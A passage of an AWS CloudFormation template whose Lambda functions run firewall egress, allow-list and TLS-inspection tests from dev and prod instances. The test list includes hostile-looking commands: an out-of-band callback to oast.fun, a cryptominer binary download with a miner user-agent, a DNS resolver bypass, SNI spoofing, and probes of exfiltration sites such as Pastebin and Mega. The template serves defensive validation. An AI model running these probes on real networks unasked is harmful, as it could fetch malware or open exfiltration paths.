                      echo "Resolved $SUCCESS/$TOTAL domains: $RESULTS"
                  """
              elif command.startswith("ping"):
                  return f"""
                      RESULT=$(timeout 2 {command})
                      if [[ $RESULT == *"0 received"* ]] || [[ $RESULT == *"Destination Host Unreachable"* ]]; then
                          echo "BLOCKED"
                      else
                          echo "ALLOWED"
                      fi
                  """
              elif command.startswith("curl"):
                  if "sld.cu" in command or "fnac.com" in command:
                      return f"""
                          RESULT=$({command})
                          if [ -n "$RESULT" ]; then
                              echo "ALLOWED"
                          else
                              echo "BLOCKED"
                          fi
                      """
                  elif "oast.fun" in command:
                      return f"""
                          RESULT=$({command})
                          if [ -n "$RESULT" ]; then
                              echo "ALLOWED"
                          else
                              echo "BLOCKED"
                          fi
                      """
                  else:
                      return f"""
                          RESPONSE=$(timeout 2 {command})
                          HTTP_CODE=$?
                          if [ $HTTP_CODE -eq 0 ]; then
                              echo "ALLOWED"
                          else
                              echo "BLOCKED"
                          fi
                      """
              elif command.startswith("ssh"):
                  return f"""
                      RESULT=$(timeout 2 {command} 2>&1)
                      if [[ $RESULT == *"Permission denied"* ]]; then
                          echo "ALLOWED"
                      elif [[ $RESULT == *"Connection timed out"* ]] || [[ $RESULT == *"Connection refused"* ]]; then
                          echo "BLOCKED"
                      else
                          echo "BLOCKED"
                      fi
                  """
              return command

          def execute_egress_test(ssm_client, instance_id, command):
              wrapped_command = get_wrapper_for_test(command)
              return execute_ssm_command(ssm_client, instance_id, wrapped_command)


          def handler(event, context):
              buffer = io.StringIO()
              sys.stdout = buffer

              ssm_client = boto3.client('ssm')
              dev_instance_id = environ['DEV_INSTANCE_ID']
              prod_instance_id = environ['PROD_INSTANCE_ID']
              public_internet_host_ip = environ['PUBLIC_INTERNET_HOST_IP']

              # Define all tests without instance IDs
              baseline_tests = [
                  {
                      'Name': 'Internet Access - GitHub',
                      'Type': 'Baseline',
                      'Command': "curl -s -k --connect-timeout 1 --max-time 1 https://github.com"
                  },
                  {
                      'Name': 'Internet Access - AWS CheckIP',
                      'Type': 'Baseline',
                      'Command': "curl -s -k --connect-timeout 1 --max-time 1 https://checkip.amazonaws.com"
                  }
              ]

              # Combined egress and IPS filtering tests in the specified order
              egress_tests = [
                  {
                      'Name': 'Route 53 Resolver DNS Firewall Aggregate Threat List',
                      'Type': 'Egress',
                      'Command': "dig controldomain1.aggregatelist.firewall.route53resolver.us-east-1.amazonaws.com"
                  },
                  {
                      'Name': 'Resolution of domains in Abused Top Level Domains',
                      'Type': 'Egress',
                      'Command': 'for domain in google.ru google.cn eth.xyz a.nic.cyou ns1.nic.pw a.dns.ws a.ns.gq a.nic.surf a.ns.cf a.nic.ml; do dig +short +timeout=1 $domain; done'
                  },
                  {
                      'Name': 'Route 53 Resolver DNS Firewall Bypass Attempt',
                      'Type': 'Egress',
                      'Command': "dig @8.8.8.8 +timeout=1 www.google.com"
                  },
                  {
                      'Name': 'Network Firewall Port/Protocol Enforcement - HTTP over non-standard port',
                      'Type': 'Egress',
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 1 'http://{public_internet_host_ip}:4444'"
                  },
                  {
                      'Name': 'Network Firewall Port/Protocol Enforcement - SSH over port 2222',
                      'Type': 'Egress',
                      'Command': f"ssh -p 2222 -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o UserKnownHostsFile=/dev/null -o PasswordAuthentication=no -v ec2-user@{public_internet_host_ip}"
                  },
                  {
                      'Name': 'Network Firewall Geographic IP Filtering - Traffic to/from ITAR Restricted Countries',
                      'Type': 'Egress',
                      'Command': "curl -k -I -s https://www.sld.cu/ --connect-timeout 1 --max-time 2"
                  },
                  {
                      'Name': 'Network Firewall Geographic IP Filtering - Traffic to/from anywhere outside the US or Canada',
                      'Type': 'Egress',
                      'Command': "curl -k -I -s https://leclaireur.fnac.com/ --connect-timeout 1 --max-time 2"
                  },
                  {
                      'Name': 'Network Firewall Active Threat Defense - Amazon Threat Intelligence',
                      'Type': 'Egress',
                      'Command': "curl -k --resolve abcd.oast.fun:443:1.1.1.2 https://abcd.oast.fun/ --connect-timeout 1 --max-time 2"
                  },
                  {
                      'Name': 'Cryptominer Binary Download',
                      'Type': 'IPSFilter',
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 1 -i 'http://{public_internet_host_ip}/cpu64.exe' -v 2>&1 || true"
                  },
                  {
                      'Name': 'Observed MultiMiner User-Agent',
                      'Type': 'IPSFilter',
                      'Command': f"curl -s -k --connect-timeout 1 --max-time 1 -H 'User-Agent: MultiMiner/V2.0' -i 'http://{public_internet_host_ip}/cpu64.exe' -v 2>&1 || true"
                  }
              ]

              print('<h2>Egress Security Tests</h2>')
              print('<hr>')

              # Process Baseline Tests
              print('<h3>Baseline Traffic Tests</h3>')
              baseline_results = execute_all_tests_in_parallel(baseline_tests, ssm_client, 'baseline', dev_instance_id, prod_instance_id)
              for test in baseline_tests:
                  log_message(f"Starting test: {test['Name']}")
                  
                  dev_status, dev_stdout, dev_stderr = baseline_results[test['Name']]['DEV']
                  prod_status, prod_stdout, prod_stderr = baseline_results[test['Name']]['PROD']
                  
                  dev_result = parse_result(dev_status, dev_stdout, dev_stderr, test['Type'])
                  prod_result = parse_result(prod_status, prod_stdout, prod_stderr, test['Type'])
                  
                  log_message(f"Test completed: {test['Name']}")
                  output_line = print_test_result(test, dev_result, prod_result)
                  print(output_line)

              # Split tests by type but display under the same heading
              print('<h3>Egress Security Tests</h3>')
              
              # Extract egress and IPS tests
              egress_only_tests = [test for test in egress_tests if test['Type'] == 'Egress']
              ips_only_tests = [test for test in egress_tests if test['Type'] == 'IPSFilter']
              
              # Process egress tests
              egress_results = execute_all_tests_in_parallel(egress_only_tests, ssm_client, 'egress', dev_instance_id, prod_instance_id)
              for test in egress_only_tests:
                  log_message(f"Starting test: {test['Name']}")
                  
                  dev_status, dev_stdout, dev_stderr = egress_results[test['Name']]['DEV']
                  prod_status, prod_stdout, prod_stderr = egress_results[test['Name']]['PROD']
                  
                  dev_result = parse_result(dev_status, dev_stdout, dev_stderr, test['Type'])
                  prod_result = parse_result(prod_status, prod_stdout, prod_stderr, test['Type'])
                  
                  log_message(f"Test completed: {test['Name']}")
                  output_line = print_test_result(test, dev_result, prod_result)
                  print(output_line)
              
              # Process IPS tests
              ips_results = execute_all_tests_in_parallel(ips_only_tests, ssm_client, 'ips_filtering', dev_instance_id, prod_instance_id)
              for test in ips_only_tests:
                  log_message(f"Starting test: {test['Name']}")
                  
                  dev_status, dev_stdout, dev_stderr = ips_results[test['Name']]['DEV']
                  prod_status, prod_stdout, prod_stderr = ips_results[test['Name']]['PROD']
                  
                  dev_result = parse_result(dev_status, dev_stdout, dev_stderr, test['Type'])
                  prod_result = parse_result(prod_status, prod_stdout, prod_stderr, test['Type'])
                  
                  log_message(f"Test completed: {test['Name']}")
                  output_line = print_test_result(test, dev_result, prod_result)
                  print(output_line)


              output = buffer.getvalue()
              sys.stdout = sys.__stdout__

              css_styles = """
              <style>
                  .success { color: green; }
                  .fail { color: red; }
                  .warning { color: orange; }
                  .normal { color: black; }
                  hr { border: 1px solid black; }
                  pre { white-space: pre-wrap; word-wrap: break-word; }
                  h3 { margin-top: 20px; margin-bottom: 10px; }
              </style>
              """

              body = css_styles + '<pre>' + output + '</pre>'
              
              return {
                  'statusCode': 200,
                  'body': body,
                  'headers': {
                      'Content-Type': 'text/html'
                  }
              }
      FunctionName: Egress-Tests
      Handler: index.handler
      Role: !GetAtt LambdaExecutionRole.Arn
      Runtime: python3.12
      MemorySize: 4096
      Timeout: 60
      LoggingConfig:
        LogGroup: !Ref EgressTesterScriptLogGroup
      Environment:
        Variables:
          DEV_INSTANCE_ID: !GetAtt DevVPC1WorkloadInstance1.InstanceId
          PROD_INSTANCE_ID: !GetAtt ProdVPC1WorkloadInstance1.InstanceId
          PROD_WEB_SERVER_IP: !GetAtt ProdVPC1WorkloadInstance1.PrivateIp
          SANITIZED_DB_IP: !GetAtt ProdVPC1WorkloadInstance3.PrivateIp
          PROD_DB_IP: !GetAtt ProdVPC1WorkloadInstance2.PrivateIp
          PUBLIC_INTERNET_HOST_IP: !GetAtt PublicInternetHost.PublicIp  

  # Lambda function URL for manual scanner function
  EgressTesterScriptFunctionURL:
    Type: AWS::Lambda::Url
    Properties:
      AuthType: AWS_IAM
      TargetFunctionArn: !GetAtt EgressTesterScript.Arn

  # Allow Manual Scanner Lambda to be invoked from CloudFront via OAC
  EgressTesterScriptPermissionPolicy:
    Metadata:
      cfn_nag:
        rules_to_suppress:
          - id: W24
            reason: "Policy is required"
    Type: AWS::Lambda::Permission
    Properties:
      Action: lambda:InvokeFunctionUrl
      FunctionName: !Ref EgressTesterScript
      Principal: cloudfront.amazonaws.com
      SourceArn: !Sub arn:${AWS::Partition}:cloudfront::${AWS::AccountId}:distribution/${TestScriptDistribution}

  AllowListTesterScriptLogGroup:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Ensure that CloudWatch Log Group is encrypted by KMS"
      cfn_nag:
        rules_to_suppress:
          - id: W84
            reason: "CloudWatch Log Group does not require KMS encryption"
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/aws/lambda/allowlist-test-lambda-logs"
      RetentionInDays: 7

  # AllowList Tester Lambda Function
  AllowListTesterScript:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_117"
            comment: "Ensure that AWS Lambda function is configured inside a VPC"
          - id: "CKV_AWS_116"
            comment: "Ensure that AWS Lambda function is configured for a Dead Letter Queue(DLQ)"
          - id: "CKV_AWS_115"
            comment: "Ensure that AWS Lambda function is configured for function-level concurrent execution limit"
          - id: "CKV_AWS_173"
            comment: "Check encryption settings for Lambda environment variable"
      cfn_nag:
        rules_to_suppress:
          - id: W89
            reason: "Lambda function does not need to be deployed in a VPC"
          - id: W92
            reason: "Lambda function does not need ReservedConcurrentExecutions"
    Type: AWS::Lambda::Function
    Properties:
      Code:
        ZipFile: |
          from os import environ
          import concurrent.futures
          import boto3
          import time
          from datetime import datetime
          import io
          import sys

          debug_mode = False

          def log_message(message):
              if debug_mode:
                  print(f"[DEBUG][{datetime.now().strftime('%H:%M:%S')}] {message}")

          def execute_ssm_command(ssm_client, instance_id, command):
              try:
                  response = ssm_client.send_command(
                      InstanceIds=[instance_id],
                      DocumentName='AWS-RunShellScript',
                      Parameters={'commands': [command]}
                  )
                  command_id = response['Command']['CommandId']

                  max_attempts = 5
                  attempt = 0
                  while attempt < max_attempts:
                      try:
                          output = ssm_client.get_command_invocation(
                              CommandId=command_id,
                              InstanceId=instance_id
                          )
                          
                          if output['Status'] in ['Success', 'Failed', 'Cancelled']:
                              return output['Status'], output.get('StandardOutputContent', ''), output.get('StandardErrorContent', '')
                          
                          time.sleep(1)
                          attempt += 1
                      except ssm_client.exceptions.InvocationDoesNotExist:
                          time.sleep(1)
                          attempt += 1
                          continue

                  return 'Timeout', '', 'Command execution timed out'
              except Exception as e:
                  log_message(f"ERROR: {str(e)}")
                  return 'Failed', '', str(e)

          def execute_all_tests_in_parallel(tests, ssm_client, dev_instance_id, prod_instance_id):
              with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
                  futures = []
                  for test in tests:
                      # Submit DEV test
                      futures.append((test['Name'], 'DEV', executor.submit(
                          execute_allowlist_test,
                          ssm_client,
                          dev_instance_id,
                          test['Command']
                      )))
                      
                      # Submit PROD test
                      futures.append((test['Name'], 'PROD', executor.submit(
                          execute_allowlist_test,
                          ssm_client,
                          prod_instance_id,
                          test['Command']
                      )))
                  
                  # Create a dict to store results
                  results = {}
                  for name, env, future in futures:
                      try:
                          result = future.result()
                          if name not in results:
                              results[name] = {'DEV': None, 'PROD': None}
                          results[name][env] = result
                      except Exception as e:
                          log_message(f"ERROR in {name} - {env}: {str(e)}")
                          
                  return results

          def parse_result(status, stdout, stderr, test_type):
              log_message(f"=== Test Details ===")
              log_message(f"Test type: {test_type}")
              log_message(f"Status: {status}")
              log_message(f"stdout: {stdout}")
              log_message(f"stderr: {stderr}")

              if test_type == 'Baseline':
                  # For baseline tests, we expect connections to succeed
                  if stdout.strip() == 'ALLOWED':
                      log_message("Baseline: Connection allowed")
                      return ('Connection Allowed', 1)
                  log_message("Baseline: Connection blocked")
                  return ('Connection Blocked', 0)
              
              elif test_type == 'AllowList':
                  # For allow list tests, we expect connections to be blocked
                  if stdout.strip() == 'BLOCKED':
                      log_message("AllowList: Connection blocked (expected)")
                      return ('Connection Blocked', 0)
                  elif stdout.strip() == 'ALLOWED':
                      log_message("AllowList: Connection allowed (unexpected)")
                      return ('Connection Allowed', 1)
                  
                  # Default to blocked if unclear
                  log_message("AllowList: Result unclear, assuming blocked")
                  return ('Connection Blocked', 0)

              # Default case
              if status != 'Success':
                  log_message("Default: Connection blocked (status not Success)")
                  return ('Connection Blocked', 0)
              log_message("Default: Connection allowed")
              return ('Connection Allowed', 1)

          def print_test_result(test, dev_result, prod_result):
              test_name = test['Name']
              sanitized_command = sanitize_command(test['Command'])
              request_line = f"Request: {sanitized_command}"
              
              log_message(f"Dev Result: {dev_result}")
              log_message(f"Prod Result: {prod_result}")
              
              # Handle different test types
              if test['Type'] == 'Baseline':
                  # For Baseline tests: 1 = success (green), 0 = failure (red)
                  dev_result_str = f'<span class="success">Connection Allowed from DEV</span>' if dev_result[1] == 1 else f'<span class="fail">Connection Blocked from DEV</span>'
                  prod_result_str = f'<span class="success">Connection Allowed from PROD</span>' if prod_result[1] == 1 else f'<span class="fail">Connection Blocked from PROD</span>'
                  line_color = "success" if dev_result[1] == 1 or prod_result[1] == 1 else "fail"
              
              elif test['Type'] == 'AllowList':
                  # For AllowList tests: 0 = blocked (green), 1 = allowed (red)
                  dev_result_str = f'<span class="fail">Connection Allowed from DEV</span>' if dev_result[1] == 1 else f'<span class="success">Connection Blocked from DEV</span>'
                  prod_result_str = f'<span class="fail">Connection Allowed from PROD</span>' if prod_result[1] == 1 else f'<span class="success">Connection Blocked from PROD</span>'
                  line_color = "success" if (dev_result[1] == 0 and prod_result[1] == 0) else "fail"
              
              # Format the full line with proper spacing and consistent coloring
              return f'<span class="{line_color}">{test_name}<span style="display:inline-block; width:50px;"></span>Result:</span> {dev_result_str} | {prod_result_str}\n{request_line}\n<hr>'

          def sanitize_command(command):
              # Remove wrapper logic for display
              sanitized = command
              
              # Simplify curl commands for display
              if "curl" in sanitized:
                  # Extract the domain from the command
                  if "github.com" in sanitized:
                      return "curl https://github.com"
                  elif "checkip.amazonaws.com" in sanitized:
                      return "curl https://checkip.amazonaws.com"
                  elif "fedoraproject.org" in sanitized:
                      return "curl https://mirrors.fedoraproject.org"
                  elif "mysql.com" in sanitized:
                      return "curl https://dev.mysql.com"
                  elif "drive.google.com" in sanitized:
                      return "curl https://drive.google.com"
                  elif "pastebin.com" in sanitized:
                      return "curl https://pastebin.com"
                  elif "dropbox.com" in sanitized:
                      return "curl https://www.dropbox.com"
                  elif "wetransfer.com" in sanitized:
                      return "curl https://wetransfer.com"
                  elif "mega.nz" in sanitized:
                      return "curl https://mega.nz"
              
              return sanitized

          def get_wrapper_for_test(command):
              """Wrapper for allowlist test commands"""
              if command.startswith("curl"):
                  # Use curl's -w flag to get HTTP status code
                  # Exit code 0 means connection succeeded, regardless of response content
                  return f"""
                      HTTP_CODE=$(timeout 3 {command} -w '%{{http_code}}' -o /dev/null 2>&1)
                      CURL_EXIT=$?
                      if [ $CURL_EXIT -eq 0 ] || [ $CURL_EXIT -eq 22 ]; then
                          # Exit code 0 = success, 22 = HTTP error (but connection worked)
                          echo "ALLOWED"
                      elif [ $CURL_EXIT -eq 124 ]; then
                          # Timeout
                          echo "BLOCKED"
                      elif [ $CURL_EXIT -eq 6 ] || [ $CURL_EXIT -eq 7 ]; then
                          # Could not resolve host (6) or failed to connect (7)
                          echo "BLOCKED"
                      else
                          # Other errors - likely blocked
                          echo "BLOCKED"
                      fi
                  """
              return command

          def execute_allowlist_test(ssm_client, instance_id, command):
              wrapped_command = get_wrapper_for_test(command)
              return execute_ssm_command(ssm_client, instance_id, wrapped_command)

          def handler(event, context):
              buffer = io.StringIO()
              sys.stdout = buffer

              ssm_client = boto3.client('ssm')
              dev_instance_id = environ['DEV_INSTANCE_ID']
              prod_instance_id = environ['PROD_INSTANCE_ID']

              # Define baseline tests - approved domains
              baseline_tests = [
                  {
                      'Name': 'Access to GitHub',
                      'Type': 'Baseline',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://github.com"
                  },
                  {
                      'Name': 'Access to AWS',
                      'Type': 'Baseline',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com"
                  },
                  {
                      'Name': 'Access to Fedora Project',
                      'Type': 'Baseline',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://mirrors.fedoraproject.org"
                  },
                  {
                      'Name': 'Access to MySQL',
                      'Type': 'Baseline',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://dev.mysql.com"
                  }
              ]

              # Define unapproved domain tests - potential data exfiltration sites
              unapproved_tests = [
                  {
                      'Name': 'Access to Google Drive',
                      'Type': 'AllowList',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://drive.google.com"
                  },
                  {
                      'Name': 'Access to Pastebin',
                      'Type': 'AllowList',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://pastebin.com"
                  },
                  {
                      'Name': 'Access to Dropbox',
                      'Type': 'AllowList',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://www.dropbox.com"
                  },
                  {
                      'Name': 'Access to WeTransfer',
                      'Type': 'AllowList',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://wetransfer.com"
                  },
                  {
                      'Name': 'Access to Mega.nz',
                      'Type': 'AllowList',
                      'Command': "curl -s -k --connect-timeout 2 --max-time 2 https://mega.nz"
                  }
              ]

              print('<h2>Domain Allow List Tests</h2>')
              print('<hr>')

              # Process Baseline Tests
              print('<h3>Baseline Traffic Tests - Approved Domains</h3>')
              baseline_results = execute_all_tests_in_parallel(baseline_tests, ssm_client, dev_instance_id, prod_instance_id)
              for test in baseline_tests:
                  log_message(f"Starting test: {test['Name']}")
                  
                  dev_status, dev_stdout, dev_stderr = baseline_results[test['Name']]['DEV']
                  prod_status, prod_stdout, prod_stderr = baseline_results[test['Name']]['PROD']
                  
                  dev_result = parse_result(dev_status, dev_stdout, dev_stderr, test['Type'])
                  prod_result = parse_result(prod_status, prod_stdout, prod_stderr, test['Type'])
                  
                  log_message(f"Test completed: {test['Name']}")
                  output_line = print_test_result(test, dev_result, prod_result)
                  print(output_line)

              # Process Unapproved Domain Tests
              print('<h3>Unapproved Domain Tests - Potential Data Exfiltration Sites</h3>')
              unapproved_results = execute_all_tests_in_parallel(unapproved_tests, ssm_client, dev_instance_id, prod_instance_id)
              for test in unapproved_tests:
                  log_message(f"Starting test: {test['Name']}")
                  
                  dev_status, dev_stdout, dev_stderr = unapproved_results[test['Name']]['DEV']
                  prod_status, prod_stdout, prod_stderr = unapproved_results[test['Name']]['PROD']
                  
                  dev_result = parse_result(dev_status, dev_stdout, dev_stderr, test['Type'])
                  prod_result = parse_result(prod_status, prod_stdout, prod_stderr, test['Type'])
                  
                  log_message(f"Test completed: {test['Name']}")
                  output_line = print_test_result(test, dev_result, prod_result)
                  print(output_line)

              output = buffer.getvalue()
              sys.stdout = sys.__stdout__

              css_styles = """
              <style>
                  .success { color: green; }
                  .fail { color: red; }
                  .warning { color: orange; }
                  .normal { color: black; }
                  hr { border: 1px solid black; }
                  pre { white-space: pre-wrap; word-wrap: break-word; }
                  h3 { margin-top: 20px; margin-bottom: 10px; }
              </style>
              """

              body = css_styles + '<pre>' + output + '</pre>'
              
              return {
                  'statusCode': 200,
                  'body': body,
                  'headers': {
                      'Content-Type': 'text/html'
                  }
              }
      FunctionName: AllowList-Tests
      Handler: index.handler
      Role: !GetAtt LambdaExecutionRole.Arn
      Runtime: python3.12
      MemorySize: 4096
      Timeout: 60
      LoggingConfig:
        LogGroup: !Ref AllowListTesterScriptLogGroup
      Environment:
        Variables:
          DEV_INSTANCE_ID: !GetAtt DevVPC1WorkloadInstance1.InstanceId
          PROD_INSTANCE_ID: !GetAtt ProdVPC1WorkloadInstance1.InstanceId

  # Lambda function URL for allowlist tester function
  AllowListTesterScriptFunctionURL:
    Type: AWS::Lambda::Url
    Properties:
      AuthType: AWS_IAM
      TargetFunctionArn: !GetAtt AllowListTesterScript.Arn

  # Allow AllowList Tester Lambda to be invoked from CloudFront via OAC
  AllowListTesterScriptPermissionPolicy:
    Metadata:
      cfn_nag:
        rules_to_suppress:
          - id: W24
            reason: "Policy is required"
    Type: AWS::Lambda::Permission
    Properties:
      Action: lambda:InvokeFunctionUrl
      FunctionName: !Ref AllowListTesterScript
      Principal: cloudfront.amazonaws.com
      SourceArn: !Sub arn:${AWS::Partition}:cloudfront::${AWS::AccountId}:distribution/${TestScriptDistribution}

  TLSInspectionTesterScriptLogGroup:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Ensure that CloudWatch Log Group is encrypted by KMS"
      cfn_nag:
        rules_to_suppress:
          - id: W84
            reason: "CloudWatch Log Group does not require KMS encryption"
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/aws/lambda/tls-inspection-test-lambda-logs"
      RetentionInDays: 7

  # TLS Inspection Tester Lambda Function
  TLSInspectionTesterScript:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_117"
            comment: "Ensure that AWS Lambda function is configured inside a VPC"
          - id: "CKV_AWS_116"
            comment: "Ensure that AWS Lambda function is configured for a Dead Letter Queue(DLQ)"
          - id: "CKV_AWS_115"
            comment: "Ensure that AWS Lambda function is configured for function-level concurrent execution limit"
          - id: "CKV_AWS_173"
            comment: "Check encryption settings for Lambda environment variable"
      cfn_nag:
        rules_to_suppress:
          - id: W89
            reason: "Lambda function does not need to be deployed in a VPC"
          - id: W92
            reason: "Lambda function does not need ReservedConcurrentExecutions"
    Type: AWS::Lambda::Function
    Properties:
      Code:
        ZipFile: |
          from os import environ
          import concurrent.futures
          import boto3
          import time
          from datetime import datetime
          import io
          import sys

          debug_mode = False

          def log_message(message):
              if debug_mode:
                  print(f"[DEBUG][{datetime.now().strftime('%H:%M:%S')}] {message}")

          def execute_ssm_command(ssm_client, instance_id, command):
              try:
                  response = ssm_client.send_command(
                      InstanceIds=[instance_id],
                      DocumentName='AWS-RunShellScript',
                      Parameters={'commands': [command]}
                  )
                  command_id = response['Command']['CommandId']

                  max_attempts = 5
                  attempt = 0
                  while attempt < max_attempts:
                      try:
                          output = ssm_client.get_command_invocation(
                              CommandId=command_id,
                              InstanceId=instance_id
                          )
                          
                          if output['Status'] in ['Success', 'Failed', 'Cancelled']:
                              return output['Status'], output.get('StandardOutputContent', ''), output.get('StandardErrorContent', '')
                          
                          time.sleep(1)
                          attempt += 1
                      except ssm_client.exceptions.InvocationDoesNotExist:
                          time.sleep(1)
                          attempt += 1
                          continue

                  return 'Timeout', '', 'Command execution timed out'
              except Exception as e:
                  log_message(f"ERROR: {str(e)}")
                  return 'Failed', '', str(e)

          def execute_all_tests_in_parallel(tests, ssm_client, dev_instance_id, prod_instance_id):
              with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
                  futures = []
                  for test in tests:
                      # Submit DEV test
                      futures.append((test['Name'], 'DEV', executor.submit(
                          execute_ssm_command,
                          ssm_client,
                          dev_instance_id,
                          test['Command']
                      )))
                      
                      # Submit PROD test
                      futures.append((test['Name'], 'PROD', executor.submit(
                          execute_ssm_command,
                          ssm_client,
                          prod_instance_id,
                          test['Command']
                      )))
                  
                  # Create a dict to store results
                  results = {}
                  for name, env, future in futures:
                      try:
                          result = future.result()
                          if name not in results:
                              results[name] = {'DEV': None, 'PROD': None}
                          results[name][env] = result
                      except Exception as e:
                          log_message(f"ERROR in {name} - {env}: {str(e)}")
                          
                  return results

          def parse_tls_result(status, stdout, stderr):
              log_message(f"=== TLS Test Details ===")
              log_message(f"Status: {status}")
              log_message(f"stdout: {stdout}")
              log_message(f"stderr: {stderr}")

              # Check for connection blocked indicators
              block_indicators = [
                  'Operation timed out',
                  'Connection refused',
                  'Failed to connect',
                  '403 Forbidden',
                  'Unable to connect',
                  'reset by peer',
                  'Empty reply from server',
                  'Connection timed out'
              ]

              connection_blocked = (
                  status == 'Timeout' or
                  any(indicator in stdout or indicator in stderr for indicator in block_indicators)
              )

              # Check for successful HTTPS connection
              if 'HTTP/1.1 200' in stdout or 'HTTP/1.1 200' in stderr:
                  log_message("TLS Test: Connection allowed (HTTP 200)")
                  return ('Connection Allowed', 0)
              elif 'HTTP/1.1' in stdout or 'HTTP/1.1' in stderr:
                  # Other HTTP responses indicate connection was made
                  log_message("TLS Test: Connection allowed (HTTP response received)")
                  return ('Connection Allowed', 0)
              elif connection_blocked:
                  log_message("TLS Test: Connection blocked")
                  return ('Connection Blocked', 1)
              elif stdout.strip() or stderr.strip():
                  # Some output received, likely allowed
                  log_message("TLS Test: Connection allowed (output received)")
                  return ('Connection Allowed', 0)
              
              log_message("TLS Test: Connection blocked (no response)")
              return ('Connection Blocked', 1)

          def print_baseline_test_result(test, dev_result, prod_result):
              test_name = test['Name']
              public_internet_host_ip = environ.get('PUBLIC_INTERNET_HOST_IP', '')
              
              # Sanitize command for display
              sanitized_command = test['Command']
              if public_internet_host_ip:
                  sanitized_command = sanitized_command.replace(public_internet_host_ip, '$PUBLIC_INTERNET_HOST')
              request_line = f"Request: {sanitized_command}"
              
              log_message(f"Dev Result: {dev_result}")
              log_message(f"Prod Result: {prod_result}")
              
              # For baseline tests: 0 = allowed (green), 1 = blocked (red)
              dev_result_str = f'<span class="success">Connection Allowed from DEV</span>' if dev_result[1] == 0 else f'<span class="fail">Connection Blocked from DEV</span>'
              prod_result_str = f'<span class="success">Connection Allowed from PROD</span>' if prod_result[1] == 0 else f'<span class="fail">Connection Blocked from PROD</span>'
              line_color = "success" if (dev_result[1] == 0 and prod_result[1] == 0) else "fail"
              
              # Format the full line with proper spacing and consistent coloring
              return f'<span class="{line_color}">{test_name}<span style="display:inline-block; width:50px;"></span>Result:</span> {dev_result_str} | {prod_result_str}\n{request_line}\n<hr>'

          def print_test_result(test, dev_result, prod_result):
              test_name = test['Name']
              public_internet_host_ip = environ.get('PUBLIC_INTERNET_HOST_IP', '')
              
              # Sanitize command for display
              sanitized_command = test['Command']
              if public_internet_host_ip:
                  sanitized_command = sanitized_command.replace(public_internet_host_ip, '$PUBLIC_INTERNET_HOST')
              request_line = f"Request: {sanitized_command}"
              
              log_message(f"Dev Result: {dev_result}")
              log_message(f"Prod Result: {prod_result}")
              
              # For TLS inspection tests: 1 = blocked (green), 0 = allowed (red)
              dev_result_str = f'<span class="success">Connection Blocked from DEV</span>' if dev_result[1] == 1 else f'<span class="fail">Connection Allowed from DEV</span>'
              prod_result_str = f'<span class="success">Connection Blocked from PROD</span>' if prod_result[1] == 1 else f'<span class="fail">Connection Allowed from PROD</span>'
              line_color = "success" if (dev_result[1] == 1 and prod_result[1] == 1) else "fail"
              
              # Format the full line with proper spacing and consistent coloring
              return f'<span class="{line_color}">{test_name}<span style="display:inline-block; width:50px;"></span>Result:</span> {dev_result_str} | {prod_result_str}\n{request_line}\n<hr>'

          def handler(event, context):
              buffer = io.StringIO()
              sys.stdout = buffer

              ssm_client = boto3.client('ssm')
              dev_instance_id = environ['DEV_INSTANCE_ID']
              prod_instance_id = environ['PROD_INSTANCE_ID']
              public_internet_host_ip = environ['PUBLIC_INTERNET_HOST_IP']

              baseline_tests = [
                  {
                      'Name': 'Baseline - Allowed GitHub Repository Access',
                      'Type': 'Baseline',
                      'Command': "curl -k -s -i --connect-timeout 2 --max-time 2 https://github.com/aws-samples/aws-networkfirewall-cfn-templates 2>&1 || true"
                  },
                  {
                      'Name': 'Baseline - Allowed AWS CheckIP Access',
                      'Type': 'Baseline',
                      'Command': "curl -k -s -i --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com 2>&1 || true"
                  }
              ]

              tls_inspection_tests = [
                  {
                      'Name': 'SNI Spoofing Detection - Spoofed checkip.amazonaws.com SNI',
                      'Type': 'TLSInspection',
                      'Command': f"curl -k -s -i --connect-timeout 2 --max-time 2 --resolve 'checkip.amazonaws.com:443:{public_internet_host_ip}' https://checkip.amazonaws.com/ 2>&1 || true"
                  },
                  {
                      'Name': 'HTTPS URI Path Filtering - Unauthorized GitHub Repository',
                      'Type': 'TLSInspection',
                      'Command': "curl -k -s -i --connect-timeout 2 --max-time 2 https://github.com/A-poc/RedTeam-Tools 2>&1 || true"
                  }
              ]

              print('<h2>TLS Inspection Security Tests</h2>')
              print('<hr>')

              print('<h3>Baseline - Allowed Traffic</h3>')
              baseline_results = execute_all_tests_in_parallel(baseline_tests, ssm_client, dev_instance_id, prod_instance_id)
              for test in baseline_tests:
                  log_message(f"Starting test: {test['Name']}")
                  
                  dev_status, dev_stdout, dev_stderr = baseline_results[test['Name']]['DEV']
                  prod_status, prod_stdout, prod_stderr = baseline_results[test['Name']]['PROD']
                  
                  dev_result = parse_tls_result(dev_status, dev_stdout, dev_stderr)
                  prod_result = parse_tls_result(prod_status, prod_stdout, prod_stderr)
                  
                  # No inversion needed for baseline tests - parse_tls_result returns 0 for allowed, 1 for blocked
                  
                  log_message(f"Test completed: {test['Name']}")
                  output_line = print_baseline_test_result(test, dev_result, prod_result)
                  print(output_line)

              print('<h3>TLS Inspection Capabilities</h3>')
              
              tls_results = execute_all_tests_in_parallel(tls_inspection_tests, ssm_client, dev_instance_id, prod_instance_id)
              for test in tls_inspection_tests:
                  log_message(f"Starting test: {test['Name']}")
                  
